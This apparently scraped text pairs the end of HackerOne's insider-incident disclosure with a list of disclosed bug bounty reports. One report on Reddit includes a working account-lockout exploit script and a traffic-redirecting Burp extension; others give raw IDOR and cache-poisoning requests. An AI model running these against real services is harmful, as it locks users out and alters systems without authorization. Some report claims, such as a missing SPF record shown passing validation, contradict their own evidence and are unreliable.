We have issued platform bans for the employee's known HackerOne accounts. We have terminated the employee for violating our values, our culture, our policies, and our employment contracts. Subject to review with counsel, we will decide whether criminal referral of this matter is appropriate. We continue forensic analysis on the logs produced and devices used by the former employee. We are reaching out to other bug bounty platforms to share details in case their customers received similar communications from "rzlr". The threat actor's motives appear to be financial in nature.

The threat actor had access to HackerOne systems between April 4th and June 23rd of 2022.

Our investigation will continue. We hope to learn and share more as the investigation continues and will update this post as needed.

# Guidance for customers
As a result of the findings of our investigation, we believe we have taken the necessary steps to contain the insider's access. Customers will understandably have questions that we hope to answer here. As any conversation about this disclosure occurs, we will update this guidance with answers to questions as necessary.

## How do I know if I have interacted with this threat actor? 
All off-platform disclosures known to us have been made with the handle “*rzlr*”. If you have been contacted by this individual, and are not already coordinating with us, please contact support-incident-06-22@hackerone.com immediately. If you receive any security report (on or off the HackerOne platform) that is aggressive or threatening in tone, please contact us immediately.

## What access did the threat actor have to customer data?
The former employee's role was to triage vulnerability disclosures for numerous customer programs. This access was granted through their normal job role and their access was visible to our investigation through standard logging within our product. No access to customer data beyond this specific job role was granted or authorized - not through our developer environment, infrastructure, or otherwise. We are confident about access *they were granted* and *what they accessed* (authorized, or not) based on this logging.

## What data did the threat actor access?
Based on internal logging, we have a clear record of what the threat actor did and did not access. In the vast majority of instances, we have no evidence that the vulnerability data accessed was misused, but we have individually notified customers who had any reports accessed by the threat actor and specified the reports that were accessed along with time of access.

## I received an email from HackerOne about this incident; what do I do?
The email you received will identify which reports have been accessed by the threat actor. For the sole purpose of mitigation, unauthorized access to these particular disclosures should be assumed. We recommend escalating the priority in mitigating the risks involved with these disclosures.

## I did *not* receive an email from HackerOne about this incident; what do I do?
We have emailed all customers who may have been impacted by this incident, based on the facts of our investigation. If you were not emailed, our investigation does not suggest that any other data was accessed. We do not recommend any further action at this time. We will update this post and notify customers of any new findings.

## I was contacted by this threat actor; what do I do?
Please contact your HackerOne customer success manager and/or support-incident-06-22@hackerone.com with the communication, we’ll include it in our investigation, and assist in any manner we can.

## My question hasn't been answered yet; what do I do?
Please contact our dedicated incident responders at support-incident-06-22@hackerone.com so we can assist.

# Guidance for Hackers
You may be concerned that your disclosures may have been unfairly re-submitted by the threat actor and may have somehow disrupted bounty eligibility by the threat actor involved. Our investigation so far has not discovered any situation where the threat actor made a duplicate disclosure that interfered with the judgment or bounty amount for the original disclosure. All disclosures made from the threat actor were considered duplicates. Bounties applied to these submissions did not impact the original submissions. We will be careful to consider fairness to hackers as our investigation continues.

If one of your reports was accessed by the threat actor, we will send you an email shortly containing the list of accessed reports. We're sharing these in the spirit of transparency. We would appreciate hearing from you (hackers@hackerone.com) if you believe any of our conclusions above are incorrect.

# Additional Improvements
We uphold our commitments to protect your data by continuously improving our resilience to attacks. We have identified several areas that have prompted continual improvement following this incident.

**Logging**: We are happy that our previous investments in logging enabled an expedient investigation and response. While we were able to quickly identify a threat actor in this instance, we will ensure we are further equipped for any eventuality. We have identified further logging improvements that will improve our ability to respond to incidents in the future.

**Detection and Response - Investigation**: Our existing capabilities did not proactively detect and prevent this attack. To ensure we can proactively detect and prevent future threats, we are adding additional employees dedicated to insider threats that will bolster detection, alerting, and response for business operations that require human access to disclosure data.

**Detection and Response - Engineering**: We are allocating additional engineering resources to invest further in internal models designed to identify anomalous access to disclosure data and trigger proactive investigative responses.

**Enhance Hiring Screening**: Our existing industry standard background, criminal, and reference check processes did not screen out the threat actor. We are evaluating possible additional enhancements tailored to this unique threat.

**Data Isolation**: Limiting the impact of a single compromised or malicious insider is an important control in our defenses. We will invest in additional analyst capacity and workflow changes to further reduce the "blast radius" of incidents of this type.	

**Red Team Tabletops**: We are planning additional simulations designed to continuously evaluate and improve our ability to effectively resist insider threats. 

In summary, this was a serious incident. We are confident the insider access is now contained. Insider threats are one of the most insidious in cybersecurity, and we stand ready to do everything in our power to reduce the likelihood of such incidents in the future. A special thank you to the customer who originally alerted us to the possibility of something being wrong and to all the customers who subsequently assisted with this incident.

Chris Evans (CISO) and Alex Rice (Founder & CTO)

---

### [Unauthorized Access - downgraded admin roles to none can still edit projects through brupsuite](https://hackerone.com/reports/1607756)

- **Report ID:** `1607756`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Omise
- **Reporter:** @irwanjugabro
- **Bounty:** - usd
- **Disclosed:** 2022-07-01T16:48:51.117Z
- **CVE(s):** -

**Vulnerability Information:**

hi team,
I found that your site is vulnerable to Unauthorized Access lead to  privilege escalation, where when the owner invites a user with admin roles, the user can still edit anything with admin access, via brupsuite, it should get an error message because the admin role has been removed.


production step:
1. The `owner `invites `user` with admin roles at https://dashboard.omise.co/team
2. Then the `user`, intercept any request using brupsuite, for example edit/add link at https://dashboard.omise.co/v2/links
3. then the `owner` lowers the role to `none`
4. then you will see, the user does not see the create link feature because the role is lost
5. but when the `user` repeats the request step#2 via brupstuite. then it will be valid.

PoC :
██████

## Impact

Unauthorized Access lead to  privilege escalation, downgraded admin roles to none can still edit projects through brupsuite

---

### [Browser is not following proper flow for redirection cause open redirect ](https://hackerone.com/reports/1579374)

- **Report ID:** `1579374`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Brave Software
- **Reporter:** @kalkii
- **Bounty:** - usd
- **Disclosed:** 2022-06-30T17:45:11.059Z
- **CVE(s):** CVE-2023-22798

**Vulnerability Information:**

## Summary:

Brave browser is not following proper flow for redirection. Browser is directly redirecting to the site that is present in redirect parameter without confirming from the main site server.
I have found this vulnerability and this is affecting Facebook. Facebook use ```l.facebook.com/l.php?u=<redirect_site>``` for redirection and when server gets the request it check whether the redirect_site is in the list of there malicious(linkshim) list or not. If not then Facebook redirect  it properly.
But when we try to go to a site like https://l.facebook.com/l.php?u=https://test.facebook-whitehat.com/ then brave browser is directly requesting to https://test.facebook-whitehat.com/ (a domain resticted by facebook which can be used for testing prepose) without asking Facebook server  whether should I redirect or not. But other browser are properly following the flow. 

## Products affected: 

 Windows 11, Version 1.38.119 Chromium: 101.0.4951.67 (Official Build) (64-bit)

## Steps To Reproduce:

1. Open brave browser in windows
2.  Intercept the requests
3. Go to ```https://l.facebook.com/l.php?u=https://test.facebook-whitehat.com/``` and you will notice that it directly generating a request ```https://test.facebook-whitehat.com/``` not to ```l.facebook.com```

## Supporting Material/References:

 I also soon how other browser is responding and how brave is responder. POC video attached

## Impact

Brave has seen a massive growth in 2021 quarter and Facebook is the one of the largest used social media.
Due to this vulnerability users that are using Brave browser are directly affected which will affect brave reputation as only brave browser users are getting affect.
As well  this vulnerability in brave browser is affecting facebook's security also.

---

### [Several Subdomains Takeover](https://hackerone.com/reports/1591085)

- **Report ID:** `1591085`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Reddit
- **Reporter:** @3amii
- **Bounty:** - usd
- **Disclosed:** 2022-06-08T20:36:30.328Z
- **CVE(s):** -

**Vulnerability Information:**

there are some subdomains in reddit.com those are vulnerable to takeover subdomain attack. I found these subdomains while I have been testing the subdomains of reddit.com.

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. create a user account in reddit.com.
  2. there are some subdomain as sample: webcovid19.reddit.com (151.101.13.140) and click on this subdomain.
  3. you will see "Sorry, there aren’t any communities on Reddit with that name" message.
  4. now create an community with the same name "webcovid19".and you will not find any message as above.
  5. well done. now you have the subdomain for your community.

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

1-for details, please find attached screenshots.
2-use this subdomain finder to find subdomains.
https://subdomainfinder.c99.nl/

## Impact

attacker can use available unclaimed subdomains for malicious intention

---

### [Misconfigurated login page able to lock login action for any account without user interaction](https://hackerone.com/reports/1582778)

- **Report ID:** `1582778`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Reddit
- **Reporter:** @ug0x01
- **Bounty:** - usd
- **Disclosed:** 2022-06-06T23:10:51.121Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
While observing a few things about the login feature, I found that the account was locked after a certain number of requests. Although this feature is actually added to prevent problems such as rate limit, it is open to account lock attacks by attackers.

## PoC
1. Save this code as `exploit.py`:

```
#!/bin/python3

from requests import get, post
from sys import argv
from warnings import filterwarnings
from time import sleep
from concurrent.futures import ThreadPoolExecutor

filterwarnings("ignore")

def get_creds():
    res = get("https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled")
    
    csrf_token = res.text.split('name="csrf_token" value="')[1].split('">')[0]
    
    return res.cookies.get_dict(), csrf_token

def lock_account(account, cookie, csrf_token):
    post("https://www.reddit.com/login", cookies=cookie, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, data={"csrf_token": csrf_token, "otp": '', "password": "asdasdasasdasd231321d", "dest": "https://www.reddit.com", "username": account}, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.reddit.com", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Referer": "https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled", "Connection": "close"}, verify=False)

cookie, csrf_token = get_creds()
    
for _ in range(14):
    ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)

print("Account Locked!!")
        
sleep(60)
    
while True:
    cookie, csrf_token = get_creds()
    
    for _ in range(14):
        ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)
        
    sleep(60)
```
2. Save this code as `helper.py`:
```
from burp import IBurpExtender
from burp import IHttpListener

import random
import socket
import struct

HOST_FROM = "www.reddit.com"
HOST_TO = "ugroon.link"

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._helpers = callbacks.getHelpers()
        
        callbacks.setExtensionName("Traffic redirector")
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        helpers = self._helpers
        if not messageIsRequest:
            return
        httpService = messageInfo.getHttpService()

        if (HOST_FROM == httpService.getHost()):
            message = helpers.bytesToString(messageInfo.getRequest())
            message = message.replace("Host: " + HOST_FROM, "Host: " + HOST_TO)
            message_array = message.split("\n")
            random_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
            message_array.insert(3, "X-My-X-Forwarded-For: " + random_ip)
            message = "\n".join(message_array)
            
            print(message)
            
            message = helpers.stringToBytes(message)
            messageInfo.setHttpService(self._helpers.buildHttpService(HOST_TO,httpService.getPort(),httpService.getProtocol()))

```
3. Download jython 2.7.0 (http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar)
4. Download a burp which is older than 2021 version (new versions giving too many errors)
5. Set jython 2.7.0 with `Extender > Options > Python Environment > Location of Jython standalone JAR file > jython 2.7.0 location`
6. Upload `helper.py` to extensions with `Extender >  Extensions > Burp Extensions > Add > helper.py location`
7. If you use linux, use `chmod +x exploit.py` for set permissions. But if you use windows, directly go to path and do next step
8. Run the exploit with `python3 exploit.py usernameofvictim` and that's all.
9. And for check to exploit work or not, try to login victim account on another device or change IP address and use a different browser for 0 track and you will see it's impossible to login account.

##PoC video

{F1746674}

#Suggested Solutions
To avoid issues like rate limit, use protections like captcha instead of using such protection

##Notes
1. On the login screen it says the account has been locked for 5 minutes. However, the exploit restarts the attack every 5 minutes, so victim can "never" login into the victim account (added for avoid misunderstandings)
2. If you have any questions or what you think is wrong with the report/impact, please mark it as needs more info before closing the report and let me answer your questions.

Cheers,
@h1ugroon

## Impact

Once the attacker starts the attack for the victim account, victim will never be able to login his/her account until the attacker stops the attack.

**Summary (researcher):**

A punishment for every mistake, a reward for every kindness

---

### [2 Cache Poisoning Attack Methods Affect Core Functionality www.exodus.com](https://hackerone.com/reports/1581454)

- **Report ID:** `1581454`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Exodus
- **Reporter:** @setiawan_
- **Bounty:** - usd
- **Disclosed:** 2022-06-06T11:31:15.445Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
www.exodus.com hosts static js and css files on Server: cloudflare . Which is cached by cloudflare and passed to all other users accessing the source. I was able to impact the core functionality by using a custom HTTP. Here are 2 details of the Bug.

## Steps To Reproduce:

**1. 501 Not Implemented**

At https://www.exodus.com/, I was able to impact core functionality by using an invalid custom HTTP header to replace the JavaScript file from https://www.exodus.com/webpack-runtime-d5cfa86b8e358efc5db3-v2.js with message '501 Not Implemented'.

```
ERROR /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1
Host: www.exodus.com
```
```
CRASH /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1
Host: www.exodus.com
```

Response :
```
HTTP/1.1 501 Not Implemented
Date: Wed, 25 May 2022 22:07:00 GMT
Content-Length: 0
Connection: keep-alive
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
Set-Cookie: __cfruid=5132a5357442dd861d107824c86a39a95057bcaf-1653516420; path=/; domain=.exodus.com; HttpOnly; Secure; SameSite=None
Server: cloudflare
CF-RAY: 711194da3f3fa131-SIN
```
( HTTP ) My custom CRASH & ERROR to fulfill a request does not work or is not found on the server this server establishes communication between the client and the server to be interrupted . Note that the CF-RAY value changes every time we send a request. CF-RAY is a hash value that encodes information about the data center and requests.

**2. Cache poisoning triggers Firewall Exodus**

When you poison a .js / .css file with additional 2 headers namely : x-rewrite-url & x-original-url it will trigger the exodus firewall rule.

GET request:
```
GET /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1
Host: www.exodus.com
x-rewrite-url: /root
```
```
GET /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1
Host: www.exodus.com
x-original-url: /root
```
Pay attention to the GET request. It looks different if you open the response in a browser, it will make a POST. Logically, if the POST, DELETE or PURGE methods are not allowed it will issue a response POST is not a valid request method ( 500 Internal Server Error ) However with 2 additional headers x-rewrite-url & x-original-url it actually makes a POST request to the internal system, interesting is not it? :
```
POST /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1
Host: www.exodus.com
```
Response :
```
HTTP/1.1 403 Forbidden
Server: cloudflare
CF-RAY: 7111ab2b8cd191c6-SIN

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <title>Exodus - Firewall Triggered</title>
```

## Supporting Material/References:
- F1744429: Crash501NotImplemented.png
- F1744430: FirewallTriggeredWithCachePoison.png
- F1744431: PostRequestTriggeredFirewall.png

==Note: I've added in the User-Agent header to help with problem tracking. https://hackerone.com/bismillahfortuner?type=user
User-Agent: h1-<bismillahfortuner>==

## Impact

www.exodus.com hosts static js and css files on Server: cloudflare . Which is cached by cloudflare and passed to all other users accessing the source. I was able to impact the core functionality by using a custom HTTP. And I can trigger exodus firewall rules using cache poisoning

---

### [8ybhy85kld9zp9xf84x6.imgur.com Subdomain Takeover](https://hackerone.com/reports/1527405)

- **Report ID:** `1527405`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Imgur
- **Reporter:** @mr_baka
- **Bounty:** - usd
- **Disclosed:** 2022-06-03T17:45:44.292Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Gents,
+ While testing ** Imgur ** I found an unclaimed subdomain which is; “8ybhy85kld9zp9xf84x6.imgur.com”, and I was able to claim it!
+ But actually I didn't upload or host a simple file like `mr_baka.html`, because I need to upgrade the account to be able to use this custom domain!
+ Anyway, you can verify that I was able to claim this subdomain by visiting https://8ybhy85kld9zp9xf84x6.imgur.com and clicking [Manage domain settings here.](https://mrbaka.squarespace.com/config#/settings/domains), which should lead you to my account; https://mrbaka.squarespace.com" .

### Before claiming:
+ {F1675230}

### After:
+ {F1675231}

## Impact

Subdomain Takeover may lead to below consequences:

- Phishing / Spear Phishing
- Malware distribution
- XSS
- Authentication bypass and more
- Credential stealing

---

### [Download full backup  [Mtn.co.rw]](https://hackerone.com/reports/1516520)

- **Report ID:** `1516520`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** MTN Group
- **Reporter:** @ibrahimatix0x01
- **Bounty:** - usd
- **Disclosed:** 2022-05-14T09:54:06.558Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I discovered few critical vulnerabilities here, one of them is exposed backup files via directory listing.


## Steps To Reproduce:

go to https://mtn.co.rw/mtn.zip and download the file
extract the file and open
you will see the full backup of the website

## Similar report:
https://hackerone.com/reports/684838

## Impact

Source code & DB credentials leakage. Attacker can use it to compromise the resource.

---

### [An attacker can archive and unarchive any structured scope object on HackerOne](https://hackerone.com/reports/1501611)

- **Report ID:** `1501611`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** HackerOne
- **Reporter:** @ahacker1
- **Bounty:** - usd
- **Disclosed:** 2022-04-18T18:22:22.857Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Hello, I have discovered an IDOR vulnerability that allows the scope of any program to be archived. Scopes are used to give information about the valid scopes of a program. For example HackerOne has the following scopes:
https://hackerone.com
https://api.hackerone.com
...

### Steps To Reproduce

1. Obtain the structured_scope_id: 
This can be found by base64 encoding: gid://hackerone/StructuredScope/NUMBER
For example, if the number was 94773 , the structered_scope_id would be Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==
Or, it could be found by intercepting the response of the program profile page.

2. Send the Following Request:
``` 
POST /graphql HTTP/2
Host: hackerone.com
Content-Length: 388
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
Accept: */*
X-Auth-Token: AUTHTOKEN
Content-Type: application/json
Origin: https://hackerone.com
Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7

{"operationName":"ArchiveScope","variables":{"structured_scope_id":"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw=="},"query":"mutation ArchiveScope($structured_scope_id: ID!) {\n  archiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
It is also possible to unarchive scopes of other programs with the following request.:
```
POST /graphql HTTP/2
Host: hackerone.com
Content-Length: 414
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
Accept: */*
X-Auth-Token: ████
Content-Type: application/json
Origin: https://hackerone.com
Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7

{"operationName":"UnarchiveStructuredScope","variables":{"structured_scope_id":"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw=="},"query":"mutation UnarchiveStructuredScope($structured_scope_id: ID!) {\n  unarchiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
Even though the response will say no structured scope exists, the scope will be archived.
Replace the structured_scope_id with the scope you wish to target and the X-Auth-Token with your token.
I will provide an Mp4 PoC soon.

## Impact

An attacker could archive or unarchive all 90000+ scopes on HackerOne.

**Summary (team):**

@ahacker1 found an Insecure Direct Object Reference (IDOR) vulnerability that allowed anyone to archive and unarchive an asset on HackerOne.com. This wasn't an easy vulnerability to spot: when exploited, the system would return an error indicating that the object wasn't found. However, the asset would still be archived or unarchived. We want to thank @ahacker1 for their persistence and disclosing the security vulnerability to us!

**A note on the triage experience**: this was a poor triage experience for the reporter. Although the security analyst followed up after each comment from the reporter, they were unable to reproduce the described vulnerability. The hacker, rightfully so, was persistent that they had found a security vulnerability. 

We're taking steps to improve this. Specifically, HackerOne's security operations team has taken feedback from the engineering team about which questions to ask in the future that will help determine the legitimacy of a security vulnerability faster. Reports will also be assigned to the HackerOne engineering team faster. We are exploring how to roll out these triage changes to other customers. Lastly, HackerOne's engineering team also added a number of asset IDs to [our policy](https://hackerone.com/security/policy_versions?type=team&change=3669996) to help reproduce similar vulnerabilities. We aim to continuously expand this list of known identifiers for hackers to proof security vulnerabilities in production.

That said, we'd be remiss if we didn't acknowledge that this vulnerability was hard to understand. When exploited, the video proof of concept showed a 404 page not found error and did not clearly demonstrate switching between different users or a program that the attacker didn't have access to.

---

### [OTP reflecting in response sensitive data exposure leads to account take over](https://hackerone.com/reports/1318087)

- **Report ID:** `1318087`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** UPchieve
- **Reporter:** @rupachandransangothi
- **Bounty:** - usd
- **Disclosed:** 2022-03-26T18:00:23.038Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Sensitive data that is otp is reflecting in the response of phone number otp verification in https://app.upchieve.org 

## Steps To Reproduce:


  1. Signin with a account
  2.After signin it will ask for phone number for otp verification.
3.Capture the request using burpsuite and see the response 
4.Now otp is exposing in the response.
5.Account take over is happening.

## Impact

Any attacker can login into user account with his/her otp verification which is a high impact of this website.sensitive data is exposing here

---

### [Application level DOS at Login Page ( Accepts Long Password )](https://hackerone.com/reports/1168804)

- **Report ID:** `1168804`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Reddit
- **Reporter:** @e100_speaks
- **Bounty:** - usd
- **Disclosed:** 2022-02-07T16:32:06.108Z
- **CVE(s):** -

**Vulnerability Information:**

Application-level Denial of Service (DOS)

It is an emerging class of security attacks on sites. They aim to overwhelm the site by flooding the server with requests that are disguised as legitimate users. The sudden increase in traffic shuts down machines and networks to make them unavailable to other users.
A DOS most often happens when an application contains either functional or architectural flaws that allow for remote interactions to consume large quantities of the host system’s resources, which can lead to the system locking-up or otherwise failing to deliver content.
DOS and DDoS (distributed denial of service) attacks are difficult to distinguish from regular surges of traffic. DoS testing is recommended to make sure your site is protected.
Step to reproduce. 

1.	Go to the link https://www.ajaxshop.nl/nl/account
2.	Signup using the email id. 
3.	On password field try to input many digits, any large password whatever is convenient for you.
4.	The password I tried is:
T123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789hellohellohellohello

## Impact

Impact :
it is possible to cause a denial a service attack on the server. This may lead to the unavailability of the websites for the legitimate users.

Remediation :
The server might not be able to handle such lengthy passwords coming from different machines simultaneously. The attacker can perform a DDOS attack by using this vulnerability.
 
The password hashing implementation must be fixed to limit the maximum length of accepted passwords.
There are two reasons for limiting the password size. 
I.	Hashing a large amount of data can cause significant resource consumption on behalf of the server and would be an easy target for Denial-of-Service attack.
II.	Normally all sites have a password minimum to maximum length like 72 characters limit or 48 limits to prevent Denial of Service attack. 

References :
https://hackerone.com/reports/840598
https://hackerone.com/reports/783356

---

### [Bug Report : [ No Valid SPF Records ]](https://hackerone.com/reports/1301696)

- **Report ID:** `1301696`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Ruby
- **Reporter:** @sohaib619
- **Bounty:** - usd
- **Disclosed:** 2022-01-13T22:39:24.752Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Team,  

Hope you are doing well. I found vulnerability in your web app

URL :  https://www.ruby-lang.org/en/s

Description :

There is an email spoofing vulnerability. Email spoofing is the forgery of an email header so that the message appears to have originated from someone or somewhere other than the actual source. Email spoofing is a tactic used in phishing and spam campaigns because people are more likely to open an email when they think it has been sent by a legitimate source. The goal of email spoofing is to get recipients to open, and possibly even respond to a solicitation.

Attack Scenario & PoC:

Once there is No SPF Records.An attacker can spoof email via any fake mailer Like Emkei.cz.An attacker can send email from name "Support" and Email: "support@target.com" with social engineering attack he can takeover user account let victim knows the phishing attack but when he see the email from the Authorized Domain. He got tricked easily.

Checking Missing SPF
There are various ways of checking missing SPF Records on a website But the Most Common and Popular way is kitterman.com

Steps to Check SPF Records on a website:-
Go to http://www.kitterman.com/spf/validate.html

Enter Target Website Ex: target.com (Do Not Add https/http or www)
Hit Check SPF (IF ANY)

I found :  


SPF record lookup and validation for: ruby-lang.org

SPF records are published in DNS as TXT records.

The TXT records found for your domain are:
_globalsign-domain-verification=6GywlC8PVV6mLfL6ToMeVqCDeqFk9IDu2uEqmYPqx3
v=spf1 +ip4:210.251.121.208/28 +ip4:221.186.184.64/28 include:_spf.google.com ~all

Checking to see if there is a valid SPF record.

Found v=spf1 record for ruby-lang.org:
v=spf1 +ip4:210.251.121.208/28 +ip4:221.186.184.64/28 include:_spf.google.com ~all

evaluating...
SPF record passed validation test with pySPF (Python SPF library)!


Screenshot and video:

image.pngimage.png



Remediation :

Replace ~all with -all to prevent fake email.

References :

https://www.digitalocean.com/community/tutorials/how-to-use-an-spf-record-to-prevent-spoofing-improve-e-mail-reliability
Reference Report 

https://hackerone.com/reports/629087  
Hope you will fix that soon. Looking forward to your positive response. 

Thanks.



Kind Regards,
Sohaib

## Impact

Impact:
An attacker would send a Fake email. The results can be more dangerous.

---

### [Missing ownership check in 2FA for secondary client login](https://hackerone.com/reports/1250474)

- **Report ID:** `1250474`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** LY Corporation
- **Reporter:** @q0jt
- **Bounty:** - usd
- **Disclosed:** 2021-12-27T01:45:06.506Z
- **CVE(s):** -

**Summary (team):**

Secondary clients such as LINE for Windows/Mac require 2FA at first login. However, due to insufficient verification logic on the server-side, the attacker was able to bypass 2FA after the attacker succeeds QR login by tricking the victim to click a specially crafted URL.

---

### [LINE Profile ID leaks in OpenChat](https://hackerone.com/reports/927338)

- **Report ID:** `927338`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** LY Corporation
- **Reporter:** @aki__0421
- **Bounty:** 3000 usd
- **Disclosed:** 2021-12-27T01:39:55.724Z
- **CVE(s):** -

**Summary (team):**

Users can participate in OpenChat using a new OpenChat profile that is distinct from the LINE profile. However, when the victim attaches an image in a post in OpenChat's Note, the ID of LINE Profile was stored together in the image's metadata. From this information, it is possible to determine the LINE user profile of OpenChat participants.

**Summary (researcher):**

Hackers were able to break anonymity in OpenChat.

---

